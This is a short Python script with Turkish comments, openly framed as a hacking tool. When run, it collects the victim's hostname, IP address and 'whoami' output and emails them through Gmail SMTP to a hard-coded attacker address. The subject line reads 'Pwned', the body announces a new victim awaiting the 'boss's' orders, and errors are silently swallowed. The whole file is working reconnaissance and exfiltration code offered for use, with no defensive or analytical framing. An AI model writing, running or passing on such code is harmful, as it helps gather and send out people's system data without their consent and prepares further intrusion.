import smtplib
import subprocess
import socket

# --- GÜVENLİK PİMİ YOK ---
# DİKKAT: Bu kod çalıştığı an kurbanın sistem bilgilerini sana mail atar.

def sistem_raporu_gonder():
    # --- HACKER AYARLARI ---
    hacker_mail = "tabdulkadir233@gmail.com"
    hacker_sifre = "google_uygulama_sifresi" # Buraya App Password gelecek
    
    print("--- SİSTEM BİLGİLERİ TOPLANIYOR ---")
    
    # 1. Kurbanın Bilgilerini Çek
    pc_adi = socket.gethostname()
    ip_adresi = socket.gethostbyname(pc_adi)
    
    # Terminalden 'whoami' komutunu çalıştır
    kullanici = subprocess.getoutput("whoami")
    
    # Raporu Hazırla
    mesaj_icerigi = f"""
    YENI KURBAN AG'A DUSTU!
    -----------------------
    Bilgisayar Adi : {pc_adi}
    IP Adresi      : {ip_adresi}
    Aktif Kullanici: {kullanici}
    -----------------------
    Hazirda bekliyor, emirlerini bekliyorum patron.
    """
    
    # 2. Raporu Hacker'a Postala
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(hacker_mail, hacker_sifre)
        
        konu = f"Subject: Pwned: {pc_adi} ({ip_adresi})\n\n"
        full_mail = konu + mesaj_icerigi
        
        server.sendmail(hacker_mail, hacker_mail, full_mail)
        server.quit()
        
        print(f"[+] Rapor başarıyla {hacker_mail} adresine gönderildi.")
        
    except Exception as e:
        pass

if __name__ == "__main__":
    sistem_raporu_gonder()